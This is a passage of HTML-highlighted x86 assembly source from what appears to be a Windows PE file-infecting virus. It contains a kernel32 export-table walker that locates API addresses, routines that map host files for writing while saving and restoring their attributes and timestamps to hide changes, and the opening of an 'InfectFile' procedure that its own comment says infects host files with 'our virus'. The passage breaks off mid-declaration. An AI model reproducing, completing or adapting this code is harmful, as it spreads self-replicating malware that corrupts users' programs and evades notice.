</span><span class="sc1">;Get Address of VxDCall API (Ordinal 1)</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                             </span><span class="sc1">;Ordinal Reqd = 1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.IED_Base</span><span class="sc0">    </span><span class="sc1">;Index In Array</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetAddressFromIndex</span><span class="sc0">

</span><span class="sc5">GetProcAddressRequired</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get Address of Names</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwVAIED</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.IED_AddressOfNames</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;VA of Address of Names</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpdwAddressOfNames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;Get Address of Name ordinals</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwVAIED</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.IED_AddressOfNameOrdinals</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;VA of Add of Name Ordinals</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpwAddressOfNameOrdinals</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;Find the API index in the AddressOfNames array</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;Save the base address of KERNEL32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;Also save in EAX</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Initialize Index to -1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpdwAddressOfNames</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szGetProcAddress</span><span class="sc0">           </span><span class="sc1">;API to be found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;Save address in ECX</span><span class="sc0">

</span><span class="sc5">CheckNextAPI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;increment index</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;go the the ebx'th index</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;get the VA from the RVA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;get address stored previously</span><span class="sc0">

</span><span class="sc5">CheckNextByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;Check Byte</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckNextAPI</span><span class="sc0">            </span><span class="sc1">;byte did not match, Incorrect API, Check Next One</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;Have we reached the end-of-string</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FoundAPI</span><span class="sc0">                </span><span class="sc1">;Yes? We've found the API</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CheckNextByte</span><span class="sc0">           </span><span class="sc1">;No, Check the next byte</span><span class="sc0">

</span><span class="sc5">FoundAPI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;EBX contains the index of the function into the array</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;Get the base address of KERNEL32</span><span class="sc0">

</span><span class="sc1">;Compute the Index</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpwAddressOfNameOrdinals</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Index</span><span class="sc0">

</span><span class="sc1">;Get the Address (EAX = Index, ESI = Kernel32 Base)</span><span class="sc0">
</span><span class="sc5">GetAddressFromIndex</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpdwAddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;RVA of the API</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;VA of the API</span><span class="sc0">

</span><span class="sc5">End_GetAddressOfKernelAPI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAddressOfKernelAPI</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        OpenAndMapFile                                  | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Opens a file from disk, and maps it into memory. The function also</span><span class="sc0">
</span><span class="sc1">;      saves the file modified time and file attributes before opening the</span><span class="sc0">
</span><span class="sc1">;      file. These are later restored by UnmapAndCloseFile</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD oamf_szFileName: Pointer to ASCIIZ name of file to be mapped</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD oamf_dwAddBytes: Number of bytes by which to increase the file size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: Starting address of memory where the file has been mapped, or 0</span><span class="sc0">
</span><span class="sc1">;      if an error occured</span><span class="sc0">
</span><span class="sc1">;   -&gt; ECX: Original File Size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">
</span><span class="sc5">OpenAndMapFile</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">oamf_szFileName</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oamf_dwAddBytes</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;Save File Attributes, and Clear all attributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileAttributesA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oamf_szFileName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwFileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;Save File Attributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oamf_szFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;File Attributes Set ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">End_OpenAndMapFile</span><span class="sc0">                          </span><span class="sc1">;No, Return 0</span><span class="sc0">

</span><span class="sc1">;Open the file in R/W mode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oamf_szFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">   </span><span class="sc1">;File Opened ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_OpenAndMapFile_Create</span><span class="sc0"> </span><span class="sc1">;No</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hHostFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;Yes, Save handle of host file</span><span class="sc0">

</span><span class="sc1">;Get and Store File Time</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileTime</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;Compute the new file size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hHostFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">oamf_dwAddBytes</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Compute New File Size</span><span class="sc0">

</span><span class="sc1">;Map the file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hHostFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;File Mapping Created</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Error_OpenAndMapFile_Mapping</span><span class="sc0">            </span><span class="sc1">;No</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMappedFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;Yes, Save Handle</span><span class="sc0">

</span><span class="sc1">;Map View of the File</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpHostFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;Have to save Mapped Address</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;File Mapped Successfully ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">End_OpenAndMapFile</span><span class="sc0">                          </span><span class="sc1">;Yes</span><span class="sc0">

</span><span class="sc1">;Error Occured, Close Files, and Restore Attributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMappedFile</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Failed, Close File Mapping</span><span class="sc0">

</span><span class="sc5">Error_OpenAndMapFile_Mapping</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hHostFile</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Failed, Close the File</span><span class="sc0">

</span><span class="sc5">Error_OpenAndMapFile_Create</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oamf_szFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;Error, Return 0</span><span class="sc0">

</span><span class="sc5">End_OpenAndMapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OpenAndMapFile</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        UnmapAndCloseFile                               | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Unmaps the open file and closes the handles associated with it. It</span><span class="sc0">
</span><span class="sc1">;      also restores the original file attributes and file time.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; uacf_szFilename: Name of the file that is being unmapped. This is</span><span class="sc0">
</span><span class="sc1">;      used only to restore the file attributes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;_____________________</span><span class="sc0">
</span><span class="sc5">UnmapAndCloseFile</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">uacf_szFilename</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc1">;Unmap File</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpHostFile</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Unmap the File</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMappedFile</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Close File Mapping</span><span class="sc0">

</span><span class="sc1">;Restore File Time</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileTime</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hHostFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;Close File</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hHostFile</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Close the File</span><span class="sc0">

</span><span class="sc1">;Restore File Attributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">uacf_szFilename</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwFileAttributes</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UnmapAndCloseFile</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        InfectFile                                      | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Infects the host file with our virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD if_szFileName: Address of the file to be infected</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD if_dwIncFileSize: Size by which the section is 2B increased (Bytes)</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD if_dwIncSecSize: Size by which the file is 2B increased (Bytes)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: 1 if Infected, 0 on Error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;__________________________________</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">if_szFileName</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">lpdwLastSection</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwVirusBegin</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwNewEntryRVA</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwJumpBytes</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwIOH</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwIncFileSize</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwIncSecSize</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
